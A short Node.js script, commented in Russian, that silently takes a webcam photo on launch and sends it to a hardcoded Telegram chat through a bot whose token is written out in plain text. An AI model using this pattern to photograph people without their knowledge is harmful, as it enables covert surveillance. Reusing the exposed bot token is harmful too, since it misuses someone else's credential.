// // Получаем доступ к видеопотоку с камеры
// navigator.mediaDevices.getUserMedia({ video: true })
// .then(stream => {
//   const video = document.getElementById('cameraFeed');
//   video.srcObject = stream;
// })
// .catch(error => {
//   console.error('Ошибка при получении доступа к камере:', error);
// });





const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const NodeWebcam = require( "node-webcam" );

// Настройки камеры
const opts = {
    width: 1280,
    height: 720,
    quality: 100,
    delay: 0,
    saveShots: true,
    output: "jpeg",
    device: false,
    callbackReturn: "location",
    verbose: false
};

// Создание объекта камеры
const Webcam = NodeWebcam.create( opts );

// Токен вашего бота в Телеграм
const token = '6936487434:AAHTB_vkcmvX8phb969ZpJhoUwoe5_Axnhw';
const chatId = '1494753646';

// Создание бота
const bot = new TelegramBot(token, { polling: true });

// Функция для создания фото и отправки в Телеграм
function takeAndSendPhoto() {
    Webcam.capture("test_picture", function( err, data ) {
        const photo = fs.createReadStream( data );
        bot.sendPhoto(chatId, photo, {caption: 'Новое фото'});
    });
}

// Вызов функции для создания фото и отправки в Телеграм
takeAndSendPhoto();
